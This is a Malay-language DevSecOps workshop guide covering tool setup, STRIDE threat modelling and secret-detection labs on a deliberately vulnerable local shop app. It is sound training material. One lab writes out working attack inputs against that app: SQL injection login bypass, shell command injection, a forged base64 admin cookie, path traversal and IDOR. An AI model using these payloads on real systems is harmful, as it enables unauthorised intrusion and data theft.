Bengkel DevSecOps Empat Hari

Bengkel ini mengajar cara membina keselamatan ke dalam proses membina dan menghantar perisian, menggunakan dua app sebenar yang sengaja tidak selamat. Anda akan mencari, memahami dan membaiki kelemahan menggunakan lima jenis imbasan, kemudian menyatukan semuanya dalam pipeline.

Jurulatih: Irwan Azam Ahmad

Apa yang anda akan capai

Selepas empat hari, anda boleh:

  1. Menerangkan DevSecOps, shift-left dan quality gate, dan kenapa kontena serta kod yang dijana AI menambah risiko.
  2. Membuat threat model ringkas untuk sebuah app web.
  3. Menjalankan Secret Detection (Gitleaks), SAST (Semgrep), SCA (Trivy, dotnet/composer audit), IaC scan (Trivy, Checkov, hadolint, kube-linter) dan DAST (ZAP), serta membaca hasilnya dengan kritikal.
  4. Menolak image ke Harbor, melihat imbasan automatik dan polisi yang menyekat image berisiko.
  5. Membina pipeline CI dengan quality gate, menjana SBOM dan menandatangani image.
  6. Mengeraskan (harden) deployment Kubernetes pada kluster k3d.

Anda mengikut satu trek. Pilih di menu kiri (Trek anda). Kandungan trek lain disembunyikan, dan anda boleh memilih Papar kedua-duanya sebagai cabaran.

Kedua-dua app ialah "Kedai Bengkel" dengan fungsi yang sama dan kelemahan yang hampir sama. Latihan IaC (k8s/, terraform/) dikongsi.

Cara guna panduan ini

  • Setiap Makmal ada kotak Selesai untuk menjejak kemajuan (disimpan dalam pelayar anda).
  • Blok kod ada butang Salin. Jalankan dalam terminal WSL2 Ubuntu (atau Linux/macOS) dari folder repo lab, kecuali dinyatakan.
  • Bahagian Jawapan dilipat. Cuba dahulu sebelum membukanya.
  • Fail yang dirujuk (skrip, polisi, tampalan) ada di bahagian Fail modul pada hujung setiap modul.

Amaran keselamatan. Kedua-dua app mengandungi kelemahan sebenar. Jalankan hanya pada laptop anda dan jangan deploy ke internet. Semua kata laluan, kunci dan token dalam repo adalah palsu dan dijana untuk latihan. Jangan guna alat imbasan pada sistem yang bukan milik anda tanpa kebenaran bertulis.

Peraturan makmal

  1. Satu alat pada satu masa. Laptop 8 GB tidak muat menjalankan semuanya serentak.
  2. Hentikan kontena selepas guna: docker ps, kemudian docker rm -f <nama>.
  3. Jangan edit server Harbor atau projek peserta lain.
  4. Bila buntu, tanya sebelum menghabiskan lebih 10 minit pada satu masalah.

Sebelum Hari 1. Semua peserta. Siapkan sekurang-kurangnya sehari sebelum bengkel kerana ada muat turun besar.

Selepas bahagian ini anda ada: terminal WSL2 dengan Docker, repo lab, alat imbasan (melalui Docker), akses ke Harbor, dan skrip semakan yang lulus.

1. WSL2 dan Docker Desktop

  1. Pasang Docker Desktop dengan backend WSL2, dan pasang taburan Ubuntu untuk WSL2.
  2. Dalam Docker Desktop: Settings → Resources → WSL integration, hidupkan Ubuntu.
  3. Hadkan memori WSL2 supaya Windows tidak kehabisan RAM. Cipta fail %UserProfile%\.wslconfig (PowerShell):
powershell
notepad $env:UserProfile\.wslconfig

dengan kandungan:

ini
[wsl2]
memory=5GB
processors=4
swap=2GB

Kemudian mulakan semula WSL dari PowerShell:

powershell
wsl --shutdown

Semua arahan dalam panduan ini dijalankan dalam terminal Ubuntu (WSL2), bukan PowerShell, kecuali ditanda PowerShell. Letak repo di dalam sistem fail Linux (~/), bukan di /mnt/c/, kerana jauh lebih laju.

Masuk ke terminal Ubuntu

Dalam PowerShell, semak taburan WSL anda:

powershell
wsl -l -v

Anda mesti melihat Ubuntu dengan VERSION 2. Jika Ubuntu tiada, pasang (PowerShell sebagai Administrator, kemudian mulakan semula komputer dan cipta nama pengguna dan kata laluan Linux apabila diminta):

powershell
wsl --install -d Ubuntu

Untuk masuk ke Ubuntu:

powershell
wsl -d Ubuntu

Anda boleh juga membuka aplikasi Ubuntu dari menu Start, atau profil Ubuntu dalam Windows Terminal. Semak anda berada di tempat yang betul:

terminal
whoami
pwd

whoami mesti nama pengguna Linux anda (bukan root) dan pwd mesti bermula dengan /home/. Untuk keluar, taip exit.

Tiga perkara yang sering menyusahkan:

  • Jangan guna wsl -u root. Folder rumah dan fail yang dijana akan menjadi milik root, dan sebahagian arahan kemudian menetapkan pemilik fail mengikut pengguna anda (id -u).
  • Jangan bekerja dalam /mnt/c/.... Jika anda menjalankan wsl dari PowerShell yang berada dalam folder Windows (contohnya C:\Users\anda\Projects), terminal Ubuntu bermula di /mnt/c/Users/anda/Projects. Taip cd ~ untuk pulang ke rumah Linux anda.
  • Jalankan semua arahan dalam satu sesi. Memanggil wsl -d Ubuntu <arahan> berulang kali dari PowerShell memulakan shell baharu setiap kali, jadi fungsi seperti source alat.sh hilang. Masuk dahulu ke dalam Ubuntu, kemudian jalankan arahan di dalamnya.

Jika Ubuntu bukan taburan lalai dan anda mahu wsl sahaja memasukinya: wsl --set-default Ubuntu.

Sahkan dalam terminal Ubuntu:

terminal
docker version --format '{{.Server.Version}}'
docker run --rm hello-world

Jangan jalankan git pull pada ~/devsecops-lab selepas anda mula membuat perubahan: repo itu ialah kerja anda, dan perubahan anda boleh berlanggar dengan kemas kini. Jika instruktur menukar app lab, anda akan diberi arahan khusus.

3. Alat imbasan (melalui Docker)

Anda tidak memasang gitleaks, trivy, semgrep dan lain-lain. Fail alat.sh (juga di bahagian Fail modul di bawah) mentakrif fungsi shell yang menjalankan setiap alat dalam kontena dengan versi yang dikunci. Anda sudah menyalinnya ke folder ~/devsecops-lab dalam Bahagian 2; jika belum, salin dengan arahan di sana.

Muat turun semua imej sekarang (≈ 7 GB, ambil masa). Lakukan di rangkaian yang laju, bukan semasa bengkel:

terminal
source alat.sh
for i in zricethezav/gitleaks:v8.30.1 aquasec/trivy:0.76.2 semgrep/semgrep:1.183.0 hadolint/hadolint:v2.12.0 \
         bridgecrew/checkov:3.4.3 stackrox/kube-linter:v0.8.3 ghcr.io/zaproxy/zaproxy:2.17.0; do docker pull "$i"; done

Sahkan. Buka terminal Ubuntu sebagai pengguna biasa anda (aplikasi Ubuntu atau Windows Terminal; bukan wsl -u root), masuk ke folder repo, dan jalankan semua arahan dalam satu sesi terminal yang sama:

terminal
source alat.sh
gitleaks version
trivy --version

source alat.sh hanya hidup dalam terminal tempat anda menjalankannya. Jika anda memanggil wsl -d Ubuntu gitleaks version dari PowerShell, setiap panggilan memulakan shell baharu dan fungsi gitleaks tidak wujud. Masuk dahulu ke dalam Ubuntu (taip wsl -d Ubuntu, tanpa arahan lain), kemudian jalankan arahan di atas. Jika source alat.sh tidak mencetak baris alat.sh dimuatkan: ..., fail itu tidak dimuatkan; semak bahawa ia disimpan dengan hujung baris Unix (sed -i 's/\r$//' alat.sh).

4a. Fail hosts (PowerShell sebagai Administrator)

powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "192.53.174.104 harbor.lab.test gitlab.lab.test"

Jika anda sudah menambah baris harbor.lab.test sebelum ini, buka fail hosts (Notepad sebagai Administrator) dan tambah gitlab.lab.test pada baris yang sama; jangan biarkan dua baris untuk IP yang sama.

Dalam terminal Ubuntu (WSL) juga, supaya curl, git dan docker di dalam WSL menemuinya:

terminal
echo "192.53.174.104 harbor.lab.test gitlab.lab.test" | sudo tee -a /etc/hosts
printf '[network]\ngenerateHosts = false\n' | sudo tee -a /etc/wsl.conf

Baris generateHosts = false menghalang WSL menulis semula /etc/hosts setiap kali ia dimulakan; ia berkuat kuasa selepas wsl --shutdown dari PowerShell. Untuk Linux/macOS biasa, hanya baris pertama diperlukan.

4b. Percayai CA lab

Simpan fail ca.crt (bahagian Fail modul di bawah) pada laptop anda. Dalam PowerShell Administrator, import ke stor akar Windows (pelayar dan Docker Desktop menggunakannya):

powershell
Import-Certificate -FilePath .\ca.crt -CertStoreLocation Cert:\LocalMachine\Root

Kemudian dalam terminal Ubuntu, supaya curl dan alat WSL juga percaya:

terminal
sudo cp ca.crt /usr/local/share/ca-certificates/lab-ca.crt
sudo update-ca-certificates

Mulakan semula Docker Desktop (klik kanan ikon dulang, Restart).

Tutup semua tetingkap pelayar dan buka semula supaya sijil baharu dikenali. Edge dan Chrome menggunakan stor sijil Windows, jadi tiada langkah tambahan. Firefox menggunakan stor sijilnya sendiri: import ca.crt di Settings → Privacy & Security → View Certificates → Authorities → Import, dan tandakan Trust this CA to identify websites; atau gunakan Edge atau Chrome.

4c. Semak

Dalam terminal Ubuntu:

terminal
curl -s https://harbor.lab.test/api/v2.0/health | head -c 200; echo
docker login harbor.lab.test -u pesertaNN
curl -s -o /dev/null -w "GitLab: %{http_code}\n" https://gitlab.lab.test:8929/users/sign_in

Jalankan semakan ini dan semua arahan curl dan git dalam tutorial di terminal Ubuntu (WSL), bukan PowerShell. curl.exe dan Git for Windows (Schannel) memeriksa pembatalan sijil dan gagal dengan CERT_TRUST_REVOCATION_STATUS_UNKNOWN terhadap sijil CA lab, yang tidak mempunyai maklumat pembatalan. Pelayar tidak terkesan.

Anda mesti melihat "status":"healthy", Login Succeeded dan GitLab: 200. Kemudian buka https://gitlab.lab.test:8929 dalam pelayar dan log masuk sebagai pesertaNN; anda akan melihat projek devsecops-lab. Jika GitLab tidak menjawab 200 sedangkan Harbor berfungsi, port 8929 mungkin disekat oleh rangkaian anda: beritahu instruktur.

Log masuk GitLab memberi 422: The change you requested was rejected? Itu ralat token CSRF: pelayar menghantar borang yang tidak sepadan dengan kuki sesinya, dan kata laluan anda tidak disemak lagi. Muat semula halaman log masuk dan log masuk dengan segera (jangan guna halaman yang sudah lama terbuka), cuba tetingkap InPrivate, atau padam kuki untuk gitlab.lab.test. Gunakan nama https://gitlab.lab.test:8929 (bukan alamat IP) selepas CA lab dipercayai, dan jangan campur kedua-duanya dalam pelayar yang sama. Pelayar Firefox memerlukan CA diimport dalam stornya sendiri (lihat catatan Persediaan 4b).

Jika docker login memberi x509: certificate signed by unknown authority:

  • Pastikan Docker Desktop sudah di-restart selepas import sijil.
  • Cadangan terakhir: Docker Desktop → Settings → Docker Engine, tambah "insecure-registries": ["harbor.lab.test"], kemudian Apply & restart. Ini melangkau pengesahan sijil dan hanya wajar untuk makmal ini.

Fail modul

alat.sh2.3 KB
bash
# alat.sh: fungsi shell yang menjalankan alat keselamatan melalui Docker.
# Anda tidak perlu memasang gitleaks, trivy, semgrep dan lain-lain pada laptop.
#
# Guna (dalam terminal WSL2 Ubuntu atau Linux/macOS, dari folder repo lab):
#   source alat.sh
#   gitleaks --version
#
# REG: awalan registry untuk imej alat. Biarkan kosong (Docker Hub). Instruktur boleh beri nilai
#      seperti REG=harbor.lab.test/dockerhub/ jika had tarik Docker Hub dicapai.
REG="${REG:-}"

gitleaks()   { docker run --rm -v "$PWD":/repo -w /repo -e GIT_CONFIG_COUNT=1 -e GIT_CONFIG_KEY_0=safe.directory -e GIT_CONFIG_VALUE_0=/repo "${REG}zricethezav/gitleaks:v8.30.1" "$@"; }
trivy()      { docker run --rm -v "$PWD":/work -w /work -v trivy-cache:/root/.cache -v /var/run/docker.sock:/var/run/docker.sock "${REG}aquasec/trivy:0.76.2" "$@"; }
semgrep()    { docker run --rm -v "$PWD":/src -w /src -e SEMGREP_SEND_METRICS=off "${REG}semgrep/semgrep:1.183.0" semgrep "$@"; }
hadolint()   { docker run --rm -i -v "$PWD":/src -w /src "${REG}hadolint/hadolint:v2.12.0" hadolint "$@"; }
checkov()    { docker run --rm -v "$PWD":/src -w /src "${REG}bridgecrew/checkov:3.4.3" "$@"; }
kube-linter(){ docker run --rm -v "$PWD":/src -w /src "${REG}stackrox/kube-linter:v0.8.3" "$@"; }
# dotnet dan composer: untuk SCA dan pengurusan pakej tanpa memasang .NET SDK atau PHP pada laptop.

Teori ringkas

DevSecOps dan shift-left

DevSecOps menjadikan keselamatan tanggungjawab bersama sepanjang kitaran pembangunan, bukan semakan akhir oleh pasukan lain. Shift-left bermaksud mengalihkan pemeriksaan ke peringkat awal (ke kiri pada garis masa): kelemahan yang ditemui semasa commit memakan masa minit untuk dibaiki; yang ditemui di produksi memakan hari, dan kadang-kadang melibatkan insiden.

Sebuah quality gate ialah syarat automatik dalam pipeline: jika imbasan menemui sesuatu yang melebihi had yang ditetapkan, pipeline gagal dan perubahan tidak bergerak ke hadapan.

Imbasan Soalan yang dijawab Contoh dalam bengkel
Secret Detection Adakah ada kata laluan atau kunci dalam kod dan sejarah git? Gitleaks
SAST Adakah kod sumber mengandungi corak yang tidak selamat? Semgrep
SCA Adakah pakej pihak ketiga ada kerentanan yang diketahui? Trivy, dotnet list package, composer audit
IaC Adakah Dockerfile, manifest K8s dan Terraform tidak selamat? Trivy config, Checkov, hadolint, kube-linter
DAST Adakah app yang sedang berjalan boleh diserang? ZAP

Tiada satu pun yang cukup sendirian. Dalam bengkel ini anda akan melihat dengan data sebenar apa yang setiap alat tangkap dan terlepas.

Kenapa kontena dan AI mengubah risiko

  • Kontena membungkus app bersama OS dan pakejnya. Satu image membawa ratusan pakej yang anda tidak tulis. Image lama atau berasaskan SDK membawa kerentanan, dan konfigurasi runtime (root, privileged) menentukan seberapa buruk kesan jika app dieksploit.
  • Kod yang dijana AI ditulis laju dan kelihatan betul. Ia boleh mengandungi corak tidak selamat (SQL digabung dengan rentetan), dan boleh mencadangkan pakej yang tidak wujud atau yang diambil alih penyerang. Kelajuan menulis tidak menambah kelajuan menyemak, jadi imbasan automatik menjadi lebih penting, bukan kurang.
  • Aplikasi yang menggunakan LLM menambah kelas risiko baharu (prompt injection, kebocoran data melalui prompt). OWASP Top 10 for LLM Applications ialah rujukan permulaan. Ia di luar skop makmal, tetapi ancaman dalam senarai itu dimodelkan dengan cara yang sama seperti di bawah.

Threat modeling

Threat modeling ialah cara berfikir sistematik tentang apa yang boleh salah sebelum menulis atau mengimbas kod. Ia menjawab empat soalan:

  1. Apa yang kita bina? Lukis gambar rajah aliran data (DFD).
  2. Apa yang boleh jadi salah? Gunakan STRIDE pada setiap aliran dan komponen.
  3. Apa yang kita buat tentangnya? Kurangkan, pindahkan, terima atau elakkan.
  4. Adakah kita buat dengan baik? Sahkan dengan ujian dan imbasan.

Elemen DFD: entiti luar (pengguna), proses (app), simpanan data (DB, fail), aliran data (anak panah), dan sempadan kepercayaan (garis yang dilalui data apabila berpindah antara tahap kepercayaan berbeza). Ancaman paling banyak berlaku pada anak panah yang merentas sempadan.

STRIDE ialah senarai semak enam jenis ancaman:

Huruf Ancaman Sifat yang dilanggar Contoh dalam Kedai Bengkel
S Spoofing Pengesahan Memalsukan cookie session untuk jadi admin
T Tampering Integriti SQL injection mengubah query
R Repudiation Tidak boleh disangkal Tiada log siapa menulis dalam buku pelawat
I Information disclosure Kerahsiaan Path traversal membaca appsettings.json atau .env
D Denial of service Ketersediaan ping tanpa had mengunci proses
E Elevation of privilege Kebenaran Command injection menjalankan arahan sebagai root

Makmal 0.1: Threat model Kedai Bengkel

Tujuan. Menjana senarai ancaman daripada DFD sebelum melihat satu pun hasil imbasan.

Masa. 60 minit, berpasangan: bahagian A (jadual) 30 minit, bahagian B (Threat Dragon) 30 minit.

Bahagian A: jadual ancaman

Rujuk rajah di atas. Salin jadual ini pada kertas atau fail teks dan isikan sekurang-kurangnya enam baris. Satu contoh diberi.

# Aliran / komponen STRIDE Ancaman Kawalan yang dicadangkan
1 Pengguna → App (log masuk) T Input log masuk digabung dalam query SQL Query berparameter
2

Soalan panduan:

  1. Aliran mana yang merentas sempadan kepercayaan?
  2. Apa yang berlaku jika data daripada pengguna sampai ke shell, sistem fail atau pangkalan data?
  3. Apa yang menentukan bahawa seseorang itu admin? Boleh dipalsukan?
  4. Apa yang dipaparkan semula kepada pengguna lain (buku pelawat)?
  5. Apa yang berlaku di sekeliling app (image, pipeline, kluster) yang tidak ada dalam rajah? Tambah satu entiti luar untuk rantaian bekalan.
Jawapan contoh
# Aliran / komponen STRIDE Ancaman Kawalan
1 Pengguna → App /login T, S SQL injection melepasi log masuk Query berparameter, hash kata laluan yang kuat (bukan MD5)
2 Pengguna → App /search T, I SQL injection membaca jadual users Query berparameter
3 Pengguna → App /search, /ping T XSS pantulan Output encoding, CSP
4 Pengguna → App /guestbook T, R XSS tersimpan, tiada CSRF, tiada log pengarang Encoding, token CSRF, log audit
5 App → Proses OS /ping E Command injection (jalan sebagai root) Jangan guna shell, senarai hujah, validasi, pengguna bukan root
6 App → Sistem fail /download I Path traversal membaca konfigurasi dan secret Normalisasi laluan, senarai putih
7 Admin → App /admin S, E Cookie base64 boleh dipalsukan Sesi ditandatangani/disulitkan di server
8 /api/users/{id} I IDOR dan hash kata laluan didedahkan Semakan kebenaran, jangan pulangkan hash
9 Pipeline → Image → Kluster T Image atau pakej dirosakkan Imbasan SCA/image, tandatangan image (Modul 6)

Perhatikan bahawa kebanyakan baris ini akan muncul semula sebagai temuan imbasan dalam modul seterusnya. Threat model memberi anda bahasa untuk menilai temuan itu.

Bahagian B: masukkan ke OWASP Threat Dragon

OWASP Threat Dragon ialah alat sumber terbuka untuk melukis DFD dan merekod ancaman bagi setiap unsur. Model disimpan sebagai satu fail JSON, jadi ia boleh dimasukkan dalam repo, disemak dalam pull request dan dikemas kini apabila reka bentuk berubah. Inilah maksud "threat model sebagai kod".

Alat ini pilihan. Jika pemasangan gagal, siapkan bahagian A sahaja; jadual dan Threat Dragon menghasilkan maklumat yang sama.

Pasang (di Windows, bukan dalam WSL). Muat turun Threat-Dragon-ng-Setup-2.6.2.exe (≈ 154 MB) daripada halaman release dan jalankan pemasang. Pilih versi desktop: ia menyimpan fail di laptop anda, tanpa log masuk GitHub dan tanpa Docker. Versi ini kami tulis semasa tutorial dibina; jika halaman release sudah ada versi lebih baharu, pilih yang stabil terkini.

Buka model. Simpan kedai-bengkel-kosong.json (bahagian Fail modul di hujung modul ini) dalam folder repo anda. Dalam Threat Dragon:

  1. Pada halaman Welcome, klik kawasan open dan pilih kedai-bengkel-kosong.json.
  2. Klik Aliran data utama (nama rajah) untuk membuka penyunting rajah. Anda akan melihat DFD yang sama seperti di atas: dua entiti luar, app, proses OS, pangkalan data, sistem fail dan garis sempadan kepercayaan.

Tambah ancaman.

  1. Klik satu unsur, contohnya anak panah Permintaan pengguna. Sifat unsur dan ancamannya muncul di panel bawah.
  2. Klik New Threat. Isi Title, pilih Threat Type (enam jenis STRIDE), Severity, tulis Description dan Mitigations, kemudian klik Apply.
  3. Ulang sehingga anda ada sekurang-kurangnya enam ancaman, sepadan dengan jadual di bahagian A. Sempadan kepercayaan tidak boleh mempunyai ancaman; letakkan ancaman pada anak panah yang merentasinya.
  4. Klik Save. Fail JSON anda kini mengandungi semua ancaman.

Ukur dengan kunci jawapan. Buka kedai-bengkel-jawapan.json dengan cara yang sama dan bandingkan. Ia mengandungi sembilan ancaman, sepadan dengan jadual jawapan di atas. Soalan perbincangan:

  • Ancaman mana yang anda lihat tetapi kunci jawapan tiada? Itu mungkin ancaman sebenar yang kami terlepas.
  • Ancaman mana yang boleh dikesan oleh imbasan (SAST, DAST, SCA) dan mana yang tidak? Tulis di sebelah setiap ancaman; jawapannya akan menjadi jelas apabila anda melihat hasil imbasan dalam modul seterusnya.

Nama jenis dan butang di atas diambil daripada dokumentasi rasmi Threat Dragon 2.x. Antara muka boleh berbeza sedikit mengikut versi.

Makmal 0.3: Eksploit manual

Tujuan. Rasa sendiri kesan tiga kelemahan. Ini ialah sebab kita mengimbas.

Ini dibenarkan kerana app ialah milik anda dan berjalan pada laptop anda sendiri.

Tetapkan alamat app:

terminal
APP=http://localhost:8080

1. SQL injection melepasi log masuk. Cuba kata laluan salah dahulu, kemudian suntik:

terminal
curl -s -X POST $APP/login --data-urlencode "username=admin" --data-urlencode "password=salah" | grep -oE "Log masuk gagal|Selamat datang[^<]*"
curl -s -X POST $APP/login --data-urlencode "username=admin'--" --data-urlencode "password=x" | grep -oE "Log masuk gagal|Selamat datang[^<]*"

2. Command injection. Ping biasa, kemudian sambung arahan:

terminal
curl -s "$APP/ping?host=127.0.0.1" | grep -oE "bytes from"
curl -s "$APP/ping?host=127.0.0.1;id" | grep -oE "uid=[^<]*"

3. Cookie sesi boleh dipalsukan. Cookie hanyalah nama:peranan dalam base64:

terminal
curl -s -o /dev/null -w "tanpa cookie: %{http_code}\n" $APP/admin
curl -s -H "Cookie: session=$(printf 'sesiapa:admin' | base64)" $APP/admin | grep -oE "Akses ditolak|Panel admin"

Bonus: path traversal dan IDOR.

terminal
curl -s "$APP/download?file=../appsettings.json" | head -12
curl -s $APP/api/users/1

Modul 1: Secret Detection dan secrets management

Hari 1, 2:00 hingga 5:00 petang

Dalam modul ini anda akan:

Teori ringkas

Apa yang dikira secret

Kata laluan pangkalan data, kunci API, token akses, kunci peribadi, rentetan sambungan dan APP_KEY sesebuah framework. Apabila satu daripadanya sampai ke git, anggap ia sudah bocor: sesiapa yang pernah klon repo, fork, atau lihat cache CI mempunyainya.

Kenapa sejarah git penting

Memadam fail dalam commit baharu tidak memadamkan ia daripada sejarah. Perintah git log -p atau klon lama masih menunjukkannya. Dalam repo lab, appsettings.Production.json (Trek A) dan .env (Trek B) pernah di-commit dan kemudian dibuang; anda akan melihat bahawa imbasan folder biasa tidak nampak tetapi imbasan sejarah nampak.

Cara alat mengesan

Teknik Cara Kelebihan Kelemahan
Regex mengikut pembekal Corak token tertentu (cth awalan kunci pembekal awan) Tepat, sedikit positif palsu Hanya format yang dikenali
Kata kunci + entropi Nama pemboleh ubah (password, api_key) dengan nilai rawak Menangkap secret generik Positif palsu dan terlepas
Pengesahan aktif Cuba guna secret pada API pembekal Mengesahkan secret masih hidup Perlu rangkaian; sesetengah organisasi tidak membenarkan

Gitleaks menggunakan dua teknik pertama dan pantas. TruffleHog menambah pengesahan aktif. Dalam bengkel ini kita guna Gitleaks sebagai alat utama kerana ia ringan dan senang diserap ke dalam pre-commit dan CI.

Secret palsu dalam repo lab sengaja tidak menyerupai format token pembekal sebenar, supaya GitHub tidak menyekat push repo lab. Itu bermakna ia ditangkap oleh peraturan generik (generic-api-key), bukan peraturan khusus pembekal.

Makmal 1.1: Imbas working tree

Tujuan. Cari secret dalam fail semasa.

terminal
source alat.sh
gitleaks dir aspnet-app --no-banner --redact=100 -f csv -r - -l error | cut -d, -f1,2,6
terminal
source alat.sh
gitleaks dir laravel-app --no-banner --redact=100 -f csv -r - -l error | cut -d, -f1,2,6

--redact=100 menyembunyikan nilai secret dalam output, satu tabiat baik supaya hasil imbasan sendiri tidak membocorkan secret ke log CI.

Soalan:

  1. Berapa banyak temuan? Dalam fail mana?
  2. Peraturan mana yang menangkapnya?
  3. Adakah semua temuan itu secret sebenar?
Jawapan

Setiap trek menemui 4 secret, semuanya dengan peraturan generic-api-key.

aspnet-app/Dockerfile (ENV Jwt__Secret), dan tiga dalam aspnet-app/appsettings.json (kata laluan pangkalan data dalam rentetan sambungan, Jwt:Secret, Pembayaran:ApiKey).

laravel-app/Dockerfile (ENV PAYMENT_API_KEY), dan tiga dalam laravel-app/config/kedai.php (payment_api_key, mail_password, db_admin_password).

Semua nilai adalah palsu, tetapi alat tidak tahu itu; anda yang perlu menilai (triage) dalam projek sebenar.

Makmal 1.2: Imbas sejarah git

Tujuan. Cari secret yang sudah dibuang daripada kod tetapi masih dalam sejarah.

terminal
git log --oneline
gitleaks git . --no-banner --no-color --redact=100 -l error -v 2>&1 | grep -E "^(File|Commit):" | paste - - | sed -E 's/Commit: (.{7})[0-9a-f]*/\1/'

Baris pertama memaparkan commit. Baris kedua mengimbas semua commit dan meringkaskan setiap temuan sebagai fail dan commit.

Soalan:

  1. Berapa banyak temuan sejarah berbanding temuan working tree dalam Makmal 1.1 (untuk seluruh repo, lihat gitleaks dir . --no-banner)?
  2. Fail mana yang hanya muncul dalam sejarah?
  3. Jika fail itu sudah tiada, adakah secret di dalamnya selamat?
Jawapan

Seluruh repo memberi 15 temuan sejarah berbanding 9 pada working tree. Enam yang tambahan hanya wujud dalam sejarah:

  • aspnet-app/appsettings.Production.json (3 temuan): ditambah dalam satu commit dan dibuang dalam commit berikutnya.
  • laravel-app/.env (3 temuan): fail .env yang di-commit secara paksa kemudian dibuang.

Secret itu tidak selamat. Sesiapa yang klon repo boleh melihatnya dengan git show <commit>:laluan/fail. Satu-satunya tindakan yang menyelesaikan masalah ialah putar (rotate) secret itu, iaitu cipta yang baharu dan batalkan yang lama.

Makmal 1.3: Peraturan tersuai

Tujuan. Menangkap secret yang peraturan lalai terlepas.

Folder k8s/ ialah manifest Kubernetes dalam repo lab (namespace.yaml, aspnet.yaml dan laravel.yaml). Dari akar repo lab, jalankan imbasan padanya. Jika Gitleaks melapor bahawa k8s tidak wujud, anda bukan dalam ~/devsecops-lab:

terminal
gitleaks dir k8s --no-banner -l error; echo "exit=$?"

Hasilnya exit=0, tiada temuan. Tetapi lihat k8s/aspnet.yaml:

terminal
grep -n -B1 -A1 Secret k8s/aspnet.yaml

Terdapat value: "..." bagi pemboleh ubah Jwt__Secret. Peraturan lalai terlepas kerana nama dan nilai berada pada dua baris berasingan.

Simpan fail gitleaks-lab.toml (bahagian Fail modul) dalam folder repo, kemudian:

terminal
gitleaks dir k8s --no-banner -c gitleaks-lab.toml --redact=100 -l error; echo "exit=$?"

Kini kedua-dua fail K8s ditangkap oleh peraturan k8s-env-secret. Buka gitleaks-lab.toml dan baca peraturan itu: regex memadankan name: yang mengandungi secret, password, api_key atau token, melintasi baris baharu, dan menangkap value: sebagai kumpulan rahsia.

Soalan: apakah fungsi medan path dan keywords dalam peraturan? Apakah risikonya jika regex terlalu longgar?

Jawapan

path mengehadkan peraturan kepada fail .yaml/.yml sahaja, dan keywords ialah penapis pantas: Gitleaks hanya menjalankan regex yang mahal pada fail yang mengandungi perkataan itu. Peraturan yang terlalu longgar menghasilkan banyak positif palsu, dan pasukan akan mula mengabaikan semua temuan. Mulakan sempit, ukur, kemudian longgarkan.

Makmal 1.4: Bandingkan dengan Trivy

Tujuan. Sedar bahawa alat berbeza mempunyai titik buta berbeza.

Trivy juga ada pengimbas secret:

terminal
source alat.sh
trivy fs --scanners secret aspnet-app
terminal
source alat.sh
trivy fs --scanners secret laravel-app

Anda tidak akan melihat temuan. Bandingkan dengan pengimbas konfigurasi Trivy, yang membaca Dockerfile:

terminal
trivy config --severity CRITICAL .
Jawapan

Pengimbas secret Trivy mencari corak token pembekal yang dikenali. Secret palsu kita sengaja tidak mengikut format itu, jadi ia terlepas sepenuhnya. Namun trivy config menemui DS-0031 (CRITICAL) pada Dockerfile: peraturan konfigurasi menegur ENV yang namanya mengandungi secret/key, tanpa melihat nilainya.

Kesimpulan: gunakan lebih daripada satu pendekatan. Gitleaks menangkap nilai, peraturan konfigurasi menangkap nama, dan keduanya melengkapi satu sama lain.

Makmal 1.5: Pre-commit hook

Tujuan. Menghalang secret daripada sampai ke git.

Cipta hook yang mengimbas hanya perubahan yang dipentaskan (staged):

terminal
cat > .git/hooks/pre-commit <<'EOF'
#!/usr/bin/env bash
source "$(git rev-parse --show-toplevel)/alat.sh" >/dev/null
gitleaks git --pre-commit --staged --redact --no-banner
EOF
chmod +x .git/hooks/pre-commit

Uji dengan secret palsu:

terminal
echo 'api_key = "Zq8w3kLm2Pv9Xb7Nc4Rt6Yh1"' > rahsia-ujian.txt
git add rahsia-ujian.txt
git commit -m "uji pre-commit"; echo "exit=$?"

Commit mesti gagal (exit=1) dan Gitleaks memaparkan leaks found: 1. Bersihkan:

terminal
git rm -q --cached rahsia-ujian.txt
rm rahsia-ujian.txt

Hook di .git/hooks/ tidak ikut klon. Dalam pasukan, guna rangka kerja pre-commit atau husky supaya hook dipasang secara automatik, dan jangan bergantung padanya semata-mata: pembangun boleh mengelak dengan --no-verify. Imbasan di CI (Modul 6) ialah jaring keselamatan sebenar.

Makmal 1.6: Baiki, baseline dan tindak balas

Tujuan. Mengeluarkan secret daripada kod, dan mengurus temuan lama dengan baseline.

Langkah 1: keluarkan secret daripada kod

Prinsipnya: kod mengandungi nama konfigurasi; nilai datang dari luar (pemboleh ubah persekitaran, secret store).

terminal
sed -i -E 's/(Password=)[^;"]+/\1/; s/("Secret": ")[^"]+/\1/; s/("ApiKey": ")[^"]+/\1/' aspnet-app/appsettings.json
sed -i '/^ENV Jwt__Secret=/d' aspnet-app/Dockerfile
git diff --stat

ASP.NET Core membaca konfigurasi daripada pemboleh ubah persekitaran dengan __ sebagai pemisah, jadi nilai disuap semasa jalan:

terminal
docker run -d --name kedai -p 8080:8080 \
  -e Jwt__Secret="$(openssl rand -hex 16)" \
  -e Pembayaran__ApiKey="$(openssl rand -hex 16)" \
  aspnet-app:latest

Untuk pembangunan tempatan tanpa Docker, guna dotnet user-secrets (disimpan di luar repo).

terminal
sed -i -E "s/env\('PAYMENT_API_KEY', '[^']*'\)/env('PAYMENT_API_KEY')/; s/('mail_password' => )'[^']*'/\1env('MAIL_PASSWORD')/; s/('db_admin_password' => )'[^']*'/\1env('DB_ADMIN_PASSWORD')/" laravel-app/config/kedai.php
sed -i '/^ENV PAYMENT_API_KEY=/d' laravel-app/Dockerfile
git diff --stat

Laravel membaca nilai daripada .env (yang diabaikan oleh git) atau pemboleh ubah persekitaran:

terminal
docker run -d --name kedai -p 8081:8080 \
  -e PAYMENT_API_KEY="$(openssl rand -hex 16)" \
  -e MAIL_PASSWORD="$(openssl rand -hex 16)" \
  -e DB_ADMIN_PASSWORD="$(openssl rand -hex 16)" \
  laravel-app:latest

Sahkan:

terminal
gitleaks dir aspnet-app --no-banner
terminal
gitleaks dir laravel-app --no-banner

Anda mesti melihat no leaks found. Hentikan kontena: docker rm -f kedai.

Simpan perubahan ini dalam git (hook pre-commit anda mengimbas perubahan dan akan lulus kerana tiada secret lagi):

terminal
git add -A
git commit -m "Keluarkan secret daripada kod"

